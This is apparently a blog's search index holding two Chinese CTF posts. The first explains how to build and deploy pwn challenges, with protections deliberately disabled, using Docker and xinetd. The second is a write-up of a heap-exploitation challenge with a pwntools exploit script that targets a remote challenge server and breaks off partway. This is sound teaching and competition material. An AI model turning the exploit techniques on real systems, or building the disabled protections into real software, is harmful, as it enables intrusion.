<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn出题</title>
      <link href="/2025/07/21/pwn%E5%87%BA%E9%A2%98/"/>
      <url>/2025/07/21/pwn%E5%87%BA%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="编写程序代码"><a href="#编写程序代码" class="headerlink" title="编写程序代码"></a>编写程序代码</h2><p>写好程序代码之后C语言(或者其他)，编译成二进制可执行程序</p><p>如果只是编译的话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc your_file_name.c -o target_name</span><br></pre></td></tr></table></figure><p>去除canary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除pie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除NX</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack  your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><h2 id="ctf-xinted部署"><a href="#ctf-xinted部署" class="headerlink" title="ctf_xinted部署"></a>ctf_xinted部署</h2><h3 id="本地："><a href="#本地：" class="headerlink" title="本地："></a>本地：</h3><ol><li><p>在bin文件夹中放入要运行的二进制程序，flag内容自定</p></li><li><p>ctf_xinetd</p><p>将./your_file替换为你的文件名，这里建议将port（容器内的端口）改为80，<del>虽然不知道为什么，但貌似这样更快一点</del></p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999 #容器内的端口</span><br><span class="line">    bind        = 0.0.0.0 #本地IP</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./your_file #!!!</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>Dockerfile<br>如果要拉取ubuntu18.0以下的版本的话在注释的地方需要改一下，按原代码写</p><p>要是上面改了容器端口的话，记得把下面的暴露端口也改掉  “EXPOSE 9999  #容器对外暴露的端口”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04   #拉取镜像版本</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf  #这个地方和原文件有点不同，需要修改一下，原文件的写法只适合拉去ubuntu18.0以下的版本</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 9999  #容器对外暴露的端口可能会用到的命令</span><br></pre></td></tr></table></figure></li><li><p>可能用到的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#用当前目录下的Dockerfile文件创建名为pwn的镜像</span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:1234:9999&quot;</span> -h <span class="string">&quot;pwn&quot;</span> --name=<span class="string">&quot;pwn&quot;</span> pwn#将本地的1234端口映射到容器中的9999端口，并给容器内的主机起名为pwn，同时将这个容器也命名为pwn，方便管理，之后通过nc 0.0.0.0 1234就可以成功了</span><br><span class="line">docker ps <span class="comment">#可以查看目前有哪些容器</span></span><br><span class="line">docker stop 容器名/ID <span class="comment">#停止容器</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器名/ID <span class="comment">#删除容器</span></span><br><span class="line">docker rmi 镜像名#删除镜像</span><br><span class="line">docker images#查看有哪些镜像</span><br><span class="line">docker <span class="built_in">exec</span> -it  容器名/ID /bin/bash <span class="comment">#进入容器</span></span><br></pre></td></tr></table></figure></li><li><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li></ol><h3 id="GZ平台部署-动态flag"><a href="#GZ平台部署-动态flag" class="headerlink" title="GZ平台部署(动态flag)"></a>GZ平台部署(动态flag)</h3><ol><li><p>在部署动态flag的时候我把start.sh改为了flag.sh,对应的Dockerfile里的内容也要修改</p></li><li><p>ctf_xinted</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 80</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1001:1001 /home/ctf ./your_file</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./flag.sh /flag.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /flag.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/flag.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>flag.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$GZCTF_FLAG</span> &gt; /home/ctf/flag</span><br><span class="line"><span class="comment"># 清除环境变量</span></span><br><span class="line"><span class="built_in">unset</span> GZCTF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li><li><p>之后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#创建镜像</span><br></pre></td></tr></table></figure></li><li><p>将镜像push到github仓库里</p><ol><li><p>现在github里弄一个Personal access tokens``Tokens(classic)，方便写入</p></li><li><p>bash命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> your_token | docker login ghcr.io --username your_id --password-stdin <span class="comment">#your_id 为你的github的用户名</span></span><br><span class="line">docker tag name_of_package ghcr.io/your_id/app:latest <span class="comment"># name_of_package为本地已经存在的镜像 app为你将要上传到仓库的名称 latest为标签</span></span><br><span class="line">docker push ghcr.io/your_id/app:latest <span class="comment">#成功push</span></span><br></pre></td></tr></table></figure><p>完成之后便可以在github里看到push进来的镜像了</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124220.png" alt="屏幕截图 2025-07-23 124220"></p></li></ol></li><li><p>在GZ平台上出题的时候将自己github里的镜像pull到平台里即可，记得按照自己镜像里的端口设置端口号</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124826.png" alt="屏幕截图 2025-07-23 124826"></p></li></ol><p>参考文章：</p><p><a href="[GZ：CTF pwn 出题流程 - Skynion&#39;s World](https://skynionkrz.github.io/2024/08/22/出题流程/#0x04-将容器镜像push到github">链接1</a>)</p><p><a href="[基于xinetd部署pwn题（百分百搭成并且可以nc靶场地址）_ctfd部署pwn题-CSDN博客](https://blog.csdn.net/Myon5/article/details/131763593">链接2</a>)</p><p><a href="[利用ctf_xinetd部署pwn题目的一些细节-先知社区](https://xz.aliyun.com/news/13944">链接3</a>)</p><h2 id="出题完成啦！！！"><a href="#出题完成啦！！！" class="headerlink" title="出题完成啦！！！"></a>出题完成啦！！！</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn 出题 ctf_xinetd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3 pwn</title>
      <link href="/2025/07/20/L3-pwn/"/>
      <url>/2025/07/20/L3-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="heack-revenge"><a href="#heack-revenge" class="headerlink" title="heack_revenge"></a>heack_revenge</h1><p>这个题比赛中没做出来，赛后复现一下</p><ol><li><p>这个题第一步就卡住我了，（<del>我还是太菜了</del>），这个题通过修改索引可以溢出到ret地址，但是最多只能覆盖一个字节，也就是说，要在0x1800~0x1900这段代码内寻找有用的gadget，结果这个题在0x186a这个地方藏了一个pop rbp，这个是解题的关键</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-20%20230952.png" alt=""></p></li></ol><ol><li><p>通过pop rbp之后，调试可以发现，rbp会指向index为0的chunk，而且可以通过修改hp，attack，可以修改chunk头中的size部分，实现堆叠，堆风水布局可以泄露libc和heap</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-21%20100010.png" alt=""></p><p>泄露libc后，在上图rbp指向的chunk中写入rop链，ret时便可以劫持程序执行流，get_shell !!!</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tty </span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fight</span>(<span class="params">concent</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;You grip your sword and shout:&#x27;</span>)</span><br><span class="line">    sl(concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hp</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">note</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,concent</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Input your content: &#x27;</span>,concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index,size</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Input your content: &#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">chr</span>(tty.CEOF))</span><br><span class="line">    ru(<span class="string">b&#x27;Read failed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to destroy (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to view (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vul2&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;43.138.2.216&#x27;</span>,<span class="number">19999</span>)</span><br><span class="line">note()</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x3f0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">esc()</span><br><span class="line">fight(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">259</span> - <span class="number">0xe0</span>) + <span class="string">b&#x27;\x37&#x27;</span> + <span class="string">b&#x27;\x6A&#x27;</span>)</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    attack()</span><br><span class="line">note()</span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,p64(he(<span class="number">0xb90</span>))+p64(he(<span class="number">0x300</span>)))</span><br><span class="line">view(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x203b20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span 